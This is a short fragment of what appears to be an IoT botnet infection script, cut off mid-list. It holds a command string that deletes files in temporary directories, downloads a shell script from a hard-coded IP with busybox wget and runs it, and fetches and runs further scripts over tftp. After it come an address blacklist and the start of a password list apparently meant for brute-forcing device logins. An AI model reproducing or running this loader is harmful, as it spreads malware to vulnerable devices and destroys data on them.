...
cmd='cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; busybox wget http://69.30.215.194/gtop.sh; sh gtop.sh; sh gtop.sh; busybox tftp -r tftp.sh -g ; sh tftp.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh\r\n'
blacklist = [
    '127'
]
passwords = [ 
